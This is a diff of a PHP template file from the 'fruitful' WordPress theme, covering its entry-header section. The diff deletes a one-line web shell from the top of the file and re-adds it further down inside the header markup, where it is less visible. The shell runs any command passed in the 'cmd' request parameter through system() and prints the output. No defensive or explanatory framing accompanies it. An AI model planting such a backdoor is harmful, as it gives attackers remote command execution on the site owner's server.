@@ -1,5 +1,3 @@
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
-
 
 <?php $options = fruitful_get_theme_options(); ?>
 
@@ -47,6 +45,8 @@
 					</div>
 					<?php endif;
 				} ?>
+		<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
 		<?php endif; // is_single() ?>
 	</header><!-- .entry-header -->
 
